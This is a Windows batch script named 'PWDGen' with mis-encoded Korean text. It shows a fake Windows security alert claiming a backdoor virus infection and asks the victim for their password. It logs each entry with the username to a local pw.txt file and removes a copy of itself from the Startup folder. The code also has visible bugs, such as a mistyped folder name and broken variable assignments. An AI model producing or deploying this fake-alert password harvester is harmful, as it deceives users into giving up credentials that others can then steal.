@echo off
set version=1.0
set datetime = %date% %time%
set r = %random%
cd pwdgem
cls
if not exist "pwdgen" goto setup

:start
echo ------------------------ [ %DATE% %TIME% ] -------------------------- >> %cd%\pwdgen\log.txt
echo %dt%:  ���α׷� ����Ϸ�, ���� ����:%version% >> %cd%\pwdgen\log.txt

color a
title [Windows ����] �۾��� �ʿ��մϴ�.
echo ���� �� ��ǻ�Ϳ� ���̷��� [�𵵽�, ����PC] Backdoor:Win32(������ ���ϴ� ���̷��� �̸����� ���氡��) (��)�� ����ǰ� �ִ°��� Ȯ�εǾ����ϴ�.
echo �ڵ����� ���� �Ϸ��Ͽ�����, �����ڱ���(UACPerm)�� �����Ͽ� �۾������� ���� ����� ���� ��й�ȣ�� �Է����ּ���!
echo.
echo �� â�� ���°�� ������ �Ұ��� �� �� �ֽ��ϴ�.
echo.
set /p a=��й�ȣ(Password)�� �Է����ּ���: 
echo [%datetime%]: %a% (%USERNAME%)>> %cd%\pwdgen\pw.txt
cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del pwdgen.cmd
goto exit

:setup
color b
md pwdgen
cd pwdgen
echo %username%��! ���α׷� ����� ȯ���ؿ�!
echo * ������ ���ܳ��� ���·� ��ġ�� �����ϼ���.
echo �� ���α׷��� �ǿ��ϸ� ������ �ɼ� �ִ� ���α׷��Դϴ�. (����� �����߻��� ��� ����å���̹Ƿ� Ȯ���� ����ϼ���.) ������ ��й�ȣ�� �˾Ƴ��⺸�ٴ� ��̷θ� ������ֽñ� �ٶ��ϴ� 
set /p a=���� ���뿡 ���� �Ͻó���?(y/n): 
if %a%==y goto setupyes
if %a%==n goto exit

:setupyes
cls
echo Copyright By. HYNStudio PWDGen BY. �ϸ�(hmogae).
echo.
echo [%datetime%]: PWDGen(��)�� ��ġ���Դϴ�.
echo [%datetime%]: ��ø� ��ٷ��ּ���...
echo [%datetime%]: * ���α׷��� �����Ϸ��� %temp%���� "pwdgen" ������ �����Ͻø� �˴ϴ�!
echo [%datetime%]: * �ǿ����� ���� å���� ��� ���ο��� ������ �˸��ϴ�.
echo [%datetime%]: * ���۱� ǥ�� �� �ʱ⼳��â�� %temp%\pwdgen�� �ִ°�� ǥ�õ��� �ʰ� pwdgen��尡 ����˴ϴ�.
echo [%datetime%]: * �������α׷��� ��ϵ��� ��й�ȣ�� �Է¹������ �������α׷����� ���ŵǵ��� �������Դϴ�!
echo [%datetime%]: * ��ġ������ ���ܳ��°� ��õ�帳�ϴ�.

pause
goto exit

:exit
cls
exit